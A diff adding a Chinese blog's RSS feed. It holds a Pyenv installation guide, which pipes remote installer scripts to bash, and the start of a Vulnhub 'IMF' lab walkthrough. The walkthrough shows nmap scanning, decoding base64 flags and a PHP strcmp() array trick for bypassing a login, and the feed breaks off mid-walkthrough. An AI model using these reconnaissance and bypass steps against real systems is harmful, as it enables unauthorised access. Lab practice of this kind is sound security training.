@@ -1,0 +1,713 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>杂项 on main1o&#39;s Blog</title>
+        <link>http://main1o.eu.org/categories/%E6%9D%82%E9%A1%B9/</link>
+        <description>Recent content in 杂项 on main1o&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <lastBuildDate>Thu, 18 May 2023 11:31:40 +0800</lastBuildDate><atom:link href="http://main1o.eu.org/categories/%E6%9D%82%E9%A1%B9/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Pyenv</title>
+        <link>http://main1o.eu.org/p/pyenv/</link>
+        <pubDate>Thu, 18 May 2023 11:31:40 +0800</pubDate>
+        
+        <guid>http://main1o.eu.org/p/pyenv/</guid>
+        <description>&lt;img src="http://main1o.eu.org/image31.png" alt="Featured image of post Pyenv" /&gt;&lt;h1 id=&#34;pyenv&#34;&gt;Pyenv&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;Python3 和 Python2 之间的差距 ， 以及Python3.10 的改动&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Pyenv&lt;/strong&gt;能方便的管理这些不同版本处于同一个系统。并且能全局切换不同的Python解释器以及Pip&lt;/li&gt;
+&lt;li&gt;操作简单，方便上手&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;一安装&#34;&gt;一、安装&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;我是 Arch Linux ，直接 &lt;code&gt;yay -S pyenv&lt;/code&gt; 或者&lt;code&gt;pacman&lt;/code&gt;即可&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;官方脚本安装&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bash&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# or&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;L&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;github&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;installer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;raw&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;installer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bash&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;二配置&#34;&gt;二、配置&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;bash&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;export PYENV_ROOT=&amp;#34;$HOME/.pyenv&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;~/.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bash_profile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;export PATH=&amp;#34;$PYENV_ROOT/bin:$PATH&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;~/.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bash_profile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;if command -v pyenv 1&amp;gt;/dev/null 2&amp;gt;&amp;amp;1; then&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  eval &amp;#34;$(pyenv init -)&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;fi&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;~/.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bash_profile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 初始化&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Zsh&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;export PYENV_ROOT=&amp;#34;$HOME/.pyenv&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;~/.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zshrc&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;export PATH=&amp;#34;$PYENV_ROOT/bin:$PATH&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;~/.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zshrc&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;if command -v pyenv 1&amp;gt;/dev/null 2&amp;gt;&amp;amp;1; then&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  eval &amp;#34;$(pyenv init -)&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;fi&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;~/.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zshrc&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 初始化&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;三基本使用&#34;&gt;三、基本使用&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;下载的版本位置：&lt;code&gt;~/.pyenv/version/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在使用 &lt;strong&gt;下载版本&lt;/strong&gt;或者&lt;strong&gt;设置版本&lt;/strong&gt; 的命令，不要加&lt;code&gt;sudo&lt;/code&gt;否则安装到&lt;strong&gt;root&lt;/strong&gt;环境&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 指定python版本执行某一个命令&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xxx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 设置python全局版本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;install&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 安装某个版本的Python&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;versions&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 输出已经安装的python版本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;version&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 输出现在设置的python版本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rehash&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 安装新版本后rehash一下&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pyenv&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 输出全部能安装的Python&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/pyenv/image-20220817144937576.png&#34;
+	width=&#34;985&#34;
+	height=&#34;534&#34;
+	srcset=&#34;http://main1o.eu.org/p/pyenv/image-20220817144937576_hufadbce24e393ca7c7eaefa14ce28d5bf_56865_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/pyenv/image-20220817144937576_hufadbce24e393ca7c7eaefa14ce28d5bf_56865_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220817144937576&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;184&#34;
+		data-flex-basis=&#34;442px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>IMF靶机</title>
+        <link>http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/</link>
+        <pubDate>Fri, 24 Jun 2022 00:00:00 +0000</pubDate>
+        
+        <guid>http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/</guid>
+        <description>&lt;img src="http://main1o.eu.org/%E7%8C%AB%E7%BE%BD%E9%9B%AB.jpg" alt="Featured image of post IMF靶机" /&gt;&lt;h1 id=&#34;vulnhub靶机&#34;&gt;Vulnhub靶机&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;难度：中等&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;信息收集&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -f 192.168.100.142
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;靶机只开放了80段口
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-1.png&#34;
+	width=&#34;1613&#34;
+	height=&#34;924&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-1_huea359479e49e4d1117805572a0553473_178803_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-1_huea359479e49e4d1117805572a0553473_178803_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-1&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;174&#34;
+		data-flex-basis=&#34;418px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;页面源代码，找到第一个Flag_1&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;echo &amp;quot;YWxsdGhlZmlsZXM=&amp;quot; | base64 -d&lt;/code&gt;,得到&lt;code&gt;allthefiles&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-2.png&#34;
+	width=&#34;1080&#34;
+	height=&#34;745&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-2_hu0a9c787f4a9e65c1b4c59a37e63aed5f_47346_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-2_hu0a9c787f4a9e65c1b4c59a37e63aed5f_47346_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-2&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;144&#34;
+		data-flex-basis=&#34;347px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;文件名疑似Base64, 拼凑解码&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;echo &amp;quot;ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==&amp;quot; | base64 -d &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag2{aW1mYWRtaW5pc3RyYXRvcg==}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;再解一下得到&lt;code&gt;imfadministrator&lt;/code&gt; ， imf 的admin登录地址，访问&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091108594.png&#34;
+	width=&#34;735&#34;
+	height=&#34;397&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091108594_hu5a8a7d9765c4767548a4e7d1da966666_19379_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091108594_hu5a8a7d9765c4767548a4e7d1da966666_19379_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519091108594&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;185&#34;
+		data-flex-basis=&#34;444px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;页面提示，没有使用SQL，密码被编码了 (似乎在页面有一个叫&amp;rsquo;Roger&amp;rsquo;&amp;hellip;)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091527826.png&#34;
+	width=&#34;485&#34;
+	height=&#34;174&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091527826_hu401af29ee5d3ad6346ec6a1e8ab68455_8472_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091527826_hu401af29ee5d3ad6346ec6a1e8ab68455_8472_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519091527826&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;278&#34;
+		data-flex-basis=&#34;668px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091533225.png&#34;
+	width=&#34;826&#34;
+	height=&#34;256&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091533225_hu70ecdc7c41c082a372659b0af3cdf734_19737_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091533225_hu70ecdc7c41c082a372659b0af3cdf734_19737_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519091533225&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;322&#34;
+		data-flex-basis=&#34;774px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在首页的登录页面下也是有3个用户提示&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091844321.png&#34;
+	width=&#34;1496&#34;
+	height=&#34;1026&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091844321_hucb105ad0715b2adb4d08bba9f5a6c0e9_183679_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091844321_hucb105ad0715b2adb4d08bba9f5a6c0e9_183679_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519091844321&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;145&#34;
+		data-flex-basis=&#34;349px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;挨个测试,rmichaels 是可以登录的，就是没有密码&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;通过之前的提示知道密码被编码的，那肯定要进行比较，猜测使用strcmp()函数进行对比&lt;/p&gt;
+&lt;p&gt;密码相等的话返回0。如果字符串和数组比较也是会返回0&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519092035881.png&#34;
+	width=&#34;455&#34;
+	height=&#34;262&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519092035881_hu647923ddb2f14e407af83e83a08581d7_10408_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519092035881_hu647923ddb2f14e407af83e83a08581d7_10408_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519092035881&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;173&#34;
